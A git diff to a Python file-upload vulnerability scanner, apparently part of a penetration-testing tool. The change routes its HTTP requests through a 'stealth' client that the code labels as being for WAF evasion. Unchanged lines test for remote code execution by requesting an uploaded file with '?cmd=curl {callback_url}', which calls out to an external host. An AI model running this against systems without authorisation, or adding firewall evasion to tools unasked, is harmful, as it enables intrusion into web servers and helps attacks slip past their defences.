@@ -11,10 +11,24 @@ Tests for insecure file upload vulnerabilities:
 
 import os
 import time
-import requests
 from typing import Dict, Any, Optional, List
 from urllib.parse import urlparse
 from io import BytesIO
+
+# Import stealth HTTP client for WAF evasion
+try:
+    from tools.http_client import safe_get, safe_post, get_stealth_session
+    USE_STEALTH = True
+except ImportError:
+    import requests
+    USE_STEALTH = False
+    
+    def safe_get(url, **kwargs):
+        return requests.get(url, **kwargs)
+    
+    def safe_post(url, **kwargs):
+        return requests.post(url, **kwargs)
+
 
 
 def discover_upload_endpoints(discovery_data: Dict[str, Any]) -> List[Dict[str, Any]]:
@@ -153,7 +167,7 @@ def test_file_upload(
                 files_dict = {param_name: (filename, BytesIO(file_content), content_type)}
                 
                 try:
-                    resp = requests.post(
+                    resp = safe_post(
                         upload_endpoint,
                         files=files_dict,
                         timeout=10
@@ -212,7 +226,7 @@ def test_file_upload(
                         for path in common_paths:
                             test_url = base_url + path
                             try:
-                                test_resp = requests.get(test_url, timeout=5)
+                                test_resp = safe_get(test_url, timeout=5)
                                 if test_resp.status_code == 200:
                                     uploaded_path = test_url
                                     result["uploaded_files"].append({
@@ -225,7 +239,7 @@ def test_file_upload(
                                     if callback_url:
                                         exec_url = f"{test_url}?cmd=curl {callback_url}"
                                         try:
-                                            exec_resp = requests.get(exec_url, timeout=5)
+                                            exec_resp = safe_get(exec_url, timeout=5)
                                             result["rce_confirmed"] = True
                                             result["evidence"] = {
                                                 "filename": filename,
